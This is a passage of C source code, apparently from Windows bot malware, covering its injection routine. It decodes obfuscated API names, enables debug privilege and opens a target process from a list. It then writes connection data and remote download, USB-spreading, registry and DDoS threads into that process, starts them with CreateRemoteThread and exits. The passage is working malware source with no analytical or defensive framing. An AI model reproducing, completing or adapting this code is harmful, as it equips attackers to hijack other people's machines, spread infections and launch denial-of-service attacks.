	MessageBox(NULL, "Starting in debug mode", NULL, MB_ICONERROR | MB_OK);
#endif

	AdjustPrivileges(SE_DEBUG_NAME);

#ifdef DEBUG
	user32_dll = LoadLibrary("user32.dll");
	if (!user32_dll)
	{
		MessageBox(NULL, "Failed to load user32.dll", NULL, MB_ICONERROR | MB_OK);
		return 0;
	}
	efs.MessageBox = (MB)GetProcAddress(user32_dll, "MessageBoxA");
	FreeLibrary(user32_dll);
#endif

	DecodeAPIStrings(strings[s_decodekey].text);

	kernel32_dll = LoadLibrary(apistr[s_kernel32]);
	if (!kernel32_dll)
	{
#ifdef DEBUG
		MessageBox(NULL, "Failed to load kernel32.dll", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}

	fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, apistr[s_CreateToolhelp32Snapshot]);
	fProcess32First = (P32F)GetProcAddress(kernel32_dll, apistr[s_Process32First]);
	fProcess32Next = (P32N)GetProcAddress(kernel32_dll, apistr[s_Process32Next]);
	fOpenProcess = (OP)GetProcAddress(kernel32_dll, apistr[s_OpenProcess]);

	if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) 
	{
		for (i = 0; inj_procs[i] != NULL; i++) 
		{
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) 
			{	
				while (fProcess32Next(hProcess, &pe32)) 
				{
					if (!lstrcmpi(pe32.szExeFile, inj_procs[i]))
					{
						if ((hProc = fOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pe32.th32ProcessID)))
							break;
					}
				}
				if (hProc)
					break;
			}
		}
	}
	else
	{
#ifdef DEBUG
		MessageBox(NULL, "Failed to create toolhelp32snapshot", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}

	efs.CloseHandle = (CH)GetProcAddress(kernel32_dll, apistr[s_CloseHandle]);
	efs.CloseHandle(hProcess);

	if (!hProc)
	{
#ifdef DEBUG
		MessageBox(NULL, "Failed to find appropriate process", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}

	injStr.holdrand = 1L;
	injStr.pending = 0;
	injStr.ddoson = 0;
	fGetModuleFileName = (GMFN)GetProcAddress(kernel32_dll, apistr[s_GetModuleFileNameA]);
	fGetModuleFileName(0, injStr.module, sizeof(injStr.module));

	ntdll_dll = LoadLibrary(apistr[s_ntdll]);
	if (!ntdll_dll)
	{
#ifdef DEBUG
		MessageBox(NULL, "Failed to load ntdll.dll", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}
	ZwWriteVirtualMemory = (ZwWVM)GetProcAddress(ntdll_dll, apistr[s_ZwWriteVirtualMemory]);
	if (!ZwWriteVirtualMemory)
	{
#ifdef DEBUG
		MessageBox(NULL, "Function failed", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}

	fVirtualAllocEx = (VAE)GetProcAddress(kernel32_dll, apistr[s_VirtualAllocEx]);

	// write strings
	for (i = 0; i < laststring; i++)
	{
		if (strings[i].text != NULL)
		{
			pAddr = fVirtualAllocEx(hProc, NULL, lstrlen(strings[i].text), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!pAddr) 
			{
				goto error;
			}
			if (ZwWriteVirtualMemory(hProc, pAddr, strings[i].text, lstrlen(strings[i].text), &dwWr) != STATUS_SUCCESS) 
			{
				goto error;
			}
			strings[i].text = pAddr;
		}	
	}

	// write connection data
	for (i = 0; condata[i].host != NULL; i++)
	{
		pAddr = fVirtualAllocEx(hProc, NULL, lstrlen(condata[i].host), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!pAddr) 
		{
			goto error;
		}
		if (ZwWriteVirtualMemory(hProc, pAddr, condata[i].host, lstrlen(condata[i].host), &dwWr) != STATUS_SUCCESS) 
		{
			goto error;
		}

		condata[i].host = pAddr;
	}

	// write function
	dwProcSize = (DWORD)ProcEnd_GenerateLetters - (DWORD)GenerateLetters;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)GenerateLetters, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	ifs.GenerateLetters = pAddr;

	// write download thread
	dwProcSize = (DWORD)ProcEnd_DownloadThread - (DWORD)RemoteDownloadThread;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)RemoteDownloadThread, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	ifs.DL_Thread = pAddr;

	// write usb thread
	dwProcSize = (DWORD)ProcEnd_USBThread - (DWORD)RemoteUSBThread;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)RemoteUSBThread, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	ifs.USB_Thread = pAddr;

	// write reg thread
	dwProcSize = (DWORD)ProcEnd_REGThread - (DWORD)RemoteREGThread;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)RemoteREGThread, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	ifs.REG_Thread = pAddr;

	// write ddos thread
	dwProcSize = (DWORD)ProcEnd_DDOSThread - (DWORD)RemoteDDOSThread;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)RemoteDDOSThread, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	ifs.DDOS_Thread = pAddr;

	// write first thread
	dwProcSize = (DWORD)ProcEnd_StartThread - (DWORD)RemoteStartThread;
	pAddr = fVirtualAllocEx(hProc, NULL, dwProcSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddr)
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pAddr, (LPVOID)RemoteStartThread, dwProcSize, &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}

	// write connection data
	pStrAddr_con = fVirtualAllocEx(hProc, NULL, sizeof(condata), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pStrAddr_con) 
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pStrAddr_con, &condata, sizeof(condata), &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	injStr.condata = pStrAddr_con;
	
	// write strings struct
	pStrAddr_str = fVirtualAllocEx(hProc, NULL, sizeof(strings), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pStrAddr_str) 
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pStrAddr_str, &strings, sizeof(strings), &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	injStr.strings = pStrAddr_str;

	ws2_32_dll = LoadLibrary(apistr[s_ws2_32]);
	wininet_dll = LoadLibrary(apistr[s_wininet]);
	shell32_dll = LoadLibrary(apistr[s_shell32]);
	advapi32_dll = LoadLibrary(apistr[s_advapi32]);

	if (!ws2_32_dll || !wininet_dll || !shell32_dll || !advapi32_dll)
	{
#ifdef DEBUG
		MessageBox(NULL, "Failed to load libraries", NULL, MB_ICONERROR | MB_OK);
#endif
		return 0;
	}

	efs.WaitForSingleObject = (WFSO)GetProcAddress(kernel32_dll, apistr[s_WaitForSingleObject]);
	efs.CreateMutex = (CM)GetProcAddress(kernel32_dll, apistr[s_CreateMutexA]);
	efs.CreateThread = (CT)GetProcAddress(kernel32_dll, apistr[s_CreateThread]);
	efs.ExitThread = (ET)GetProcAddress(kernel32_dll, apistr[s_ExitThread]);
	efs.Sleep = (SLP)GetProcAddress(kernel32_dll, apistr[s_Sleep]);
	efs.GetTickCount = (GTC)GetProcAddress(kernel32_dll, apistr[s_GetTickCount]);
	efs.CreateFile = (CF)GetProcAddress(kernel32_dll, apistr[s_CreateFileA]);
	efs.WriteFile = (WF)GetProcAddress(kernel32_dll, apistr[s_WriteFile]);
	efs.CreateProcess = (CP)GetProcAddress(kernel32_dll, apistr[s_CreateProcessA]);
	efs.GetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, apistr[s_GetLogicalDriveStringsA]);
	efs.GetDriveType = (GDT)GetProcAddress(kernel32_dll, apistr[s_GetDriveTypeA]);
	efs.CreateDirectory = (CD)GetProcAddress(kernel32_dll, apistr[s_CreateDirectoryA]);
	efs.GetLastError = (GLE)GetProcAddress(kernel32_dll, apistr[s_GetLastError]);
	efs.SetFileAttributes = (SFA)GetProcAddress(kernel32_dll, apistr[s_SetFileAttributesA]);
	efs.CopyFile = (CFile)GetProcAddress(kernel32_dll, apistr[s_CopyFileA]);
	efs.DeleteFile = (DF)GetProcAddress(kernel32_dll, apistr[s_DeleteFileA]);
	efs.lstrlen = (lsl)GetProcAddress(kernel32_dll, apistr[s_lstrlen]);
	efs.lstrcat = (lsc)GetProcAddress(kernel32_dll, apistr[s_lstrcat]);
	efs.lstrcmp = (lscmp)GetProcAddress(kernel32_dll, apistr[s_lstrcmp]);
	efs.lstrcmpi = (lscmpi)GetProcAddress(kernel32_dll, apistr[s_lstrcmpi]);
	efs.lstrcpyn = (lscn)GetProcAddress(kernel32_dll, apistr[s_lstrcpyn]);

	efs.WSAStartup = (WSAS)GetProcAddress(ws2_32_dll, apistr[s_WSAStartup]);
	efs.socket = (SOCK)GetProcAddress(ws2_32_dll, apistr[s_socket]);
	efs.connect = (CON)GetProcAddress(ws2_32_dll, apistr[s_connect]);
	efs.inet_addr = (IADDR)GetProcAddress(ws2_32_dll, apistr[s_inet_addr]);
	efs.htons = (HTONS)GetProcAddress(ws2_32_dll, apistr[s_htons]);
	efs.send = (SEND)GetProcAddress(ws2_32_dll, apistr[s_send]);
	efs.recv = (RECV)GetProcAddress(ws2_32_dll, apistr[s_recv]);
	efs.closesocket = (CLSO)GetProcAddress(ws2_32_dll, apistr[s_closesocket]);
	efs.gethostbyname = (GHBN)GetProcAddress(ws2_32_dll, apistr[s_gethostbyname]);
	efs.sendto = (SENDTO)GetProcAddress(ws2_32_dll, "sendto");
	efs.WSASocket = (WSASock)GetProcAddress(ws2_32_dll, "WSASocketA");
	efs.htonl = (HTONL)GetProcAddress(ws2_32_dll, "htonl");
	efs.setsockopt = (sso)GetProcAddress(ws2_32_dll, "setsockopt");

	efs.InternetOpen = (IO)GetProcAddress(wininet_dll, apistr[s_InternetOpenA]);
	efs.InternetOpenUrl = (IOU)GetProcAddress(wininet_dll, apistr[s_InternetOpenUrlA]);
	efs.InternetReadFile = (IRF)GetProcAddress(wininet_dll, apistr[s_InternetReadFile]);
	efs.InternetCloseHandle = (ICH)GetProcAddress(wininet_dll, apistr[s_InternetCloseHandle]);

	efs.ShellExecute = (SE)GetProcAddress(shell32_dll, apistr[s_ShellExecuteA]);

	efs.RegCloseKey = (RCK)GetProcAddress(advapi32_dll, apistr[s_RegCloseKey]);
	efs.RegSetValueEx = (RSVE)GetProcAddress(advapi32_dll, apistr[s_RegSetValueExA]);
	efs.RegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll, apistr[s_RegCreateKeyExA]);
	efs.RegDeleteKey = (RDK)GetProcAddress(advapi32_dll, apistr[s_RegDeleteKeyA]);
	efs.RegDeleteValue = (RDV)GetProcAddress(advapi32_dll, apistr[s_RegDeleteValueA]);

	// todo: add function checks

	// write ext functions struct
	pStrAddr_efs = fVirtualAllocEx(hProc, NULL, sizeof(efs), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pStrAddr_efs) 
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pStrAddr_efs, &efs, sizeof(efs), &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	injStr.efs = pStrAddr_efs;

	// write int functions struct
	pStrAddr_ifs = fVirtualAllocEx(hProc, NULL, sizeof(ifs), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pStrAddr_ifs) 
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pStrAddr_ifs, &ifs, sizeof(ifs), &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}
	// save address
	injStr.ifs = pStrAddr_ifs;


	// write inject struct
	pStrAddr = fVirtualAllocEx(hProc, NULL, sizeof(injStr), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pStrAddr) 
	{
		goto error;
	}
	if (ZwWriteVirtualMemory(hProc, pStrAddr, &injStr, sizeof(injStr), &dwWr) != STATUS_SUCCESS) 
	{
		goto error;
	}

	// run first thread
	fCreateRemoteThread = (CRT)GetProcAddress(kernel32_dll, apistr[s_CreateRemoteThread]);
	remote_thread = fCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pAddr, pStrAddr, 0, &thread_id);
	
	if (remote_thread != NULL)
	{
#ifdef DEBUG
		MessageBox(NULL, "Injected!", NULL, MB_ICONERROR | MB_OK);
#endif
		efs.CloseHandle(hProc);
		ExitProcess(0);
	} 

	error:

#ifdef DEBUG
	MessageBox(NULL, "Injection error", NULL, MB_ICONERROR | MB_OK);
#endif

	efs.CloseHandle(hProc);
	ExitProcess(0);
}
